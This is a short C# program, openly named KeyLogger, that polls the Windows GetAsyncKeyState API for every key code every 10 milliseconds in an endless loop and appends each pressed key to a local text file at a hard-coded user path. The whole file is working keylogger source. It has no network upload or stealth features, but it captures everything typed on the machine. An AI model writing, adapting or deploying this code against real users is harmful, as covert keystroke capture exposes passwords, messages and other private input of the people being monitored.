using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;

namespace KeyLogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static void Main(string[] args)
        {
            LogKeys();
        }

        static void LogKeys()
        {
            String path = (@"C:\Users\Alan\Documents\general\KeyLog.text");
            
            if(!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {
                }
            }

            KeysConverter converter = new KeysConverter();
            String text = "";


            while(true)
            {
                Thread.Sleep(10);

                for(Int32 i = 0; i < 255; i++)
                {
                    int key = GetAsyncKeyState(i);

                    if(key == 1 || key == -32767)
                    {
                        text = converter.ConvertToString(i);

                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.WriteLine(text);
                        }
                        break;
                    }
                }
            }
        }
    }
}
